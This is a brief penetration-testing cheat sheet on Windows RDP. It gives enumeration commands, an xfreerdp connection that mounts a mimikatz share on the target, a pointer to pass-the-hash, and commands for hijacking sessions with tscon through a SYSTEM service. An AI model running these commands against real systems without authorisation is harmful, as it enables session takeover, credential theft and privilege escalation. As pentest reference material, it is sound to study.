+++
title = "Win: RDP"
+++

- `TCP 3389`: normal
- `UDP 3389`: automatic w/ RDP 8.0+ for performance (frames, audio, etc.)
- https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tscon

Also called "Terminal Services".

**Pass the Hash via RDP**: See [RDP (Restricted Admin Mode)]({{% relref "../6 - Post-Exploitation/pass-the-hash#rdp-restricted-admin-mode" %}})

```bash
# Enum via nmap
sudo nmap -sV -sC --script 'rdp*' -p3389 <TARGET>

# Enum RDP security posture
sudo cpan
sudo cpan Encoding::BER
git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
./rdp-sec-check.pl <TARGET>

# Connects to RDP and mounts mimikatz share
xfreerdp3 +multitransport /clipboard /dynamic-resolution /cert:ignore /v:<TARGET> /u:<USER> /p:'<PASSWORD>' /drive:'/usr/share/windows-resources/mimikatz/x64',share

# Impersonate other logged-in user
# NOTE: needs SYSTEM
query.exe user
tscon.exe <SESSION_ID> /dest:<SESSION_NAME>

# Local Admin => SYSTEM
sc.exe create sessionhijack binpath= "cmd.exe /k tscon.exe <SESSION_ID> /dest:<SESSION_NAME>"
net.exe start sessionhijack
```
